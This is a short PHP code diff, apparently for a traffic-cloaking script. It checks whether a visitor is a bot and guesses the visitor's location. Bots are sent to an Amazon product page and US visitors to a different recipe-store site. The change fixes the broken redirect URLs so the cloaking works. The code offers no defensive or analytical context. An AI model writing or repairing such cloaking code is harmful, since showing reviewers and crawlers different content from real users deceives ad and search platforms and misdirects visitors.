@@ -14,7 +14,6 @@ function getUserIP() {
 function getLocationFromIP($ip) {
     // Example: Mock function to simulate location
     // Replace with actual IP-to-location service
-    // For simplicity, let's assume it returns "US" for US IPs
     return 'US';  // Mock return value, replace with actual implementation
 }
 
@@ -34,10 +33,10 @@ foreach ($bots as $bot) {
 
 // Redirect logic
 if ($isBot) {
-    header('Location: /https://www.amazon.com/Simple-Joys-Carters-Short-Sleeve-Bodysuit/dp/B07GY1RRZF');
+    header('Location: https://www.amazon.com/Simple-Joys-Carters-Short-Sleeve-Bodysuit/dp/B07GY1RRZF');
     exit();
 } else if ($userLocation === 'US') {
-    header('Location: /https://roastandrelish.store/honey-chicken-recipe-french');
+    header('Location: https://roastandrelish.store/honey-chicken-recipe-french');
     exit();
 } else {
     // Default redirection or content
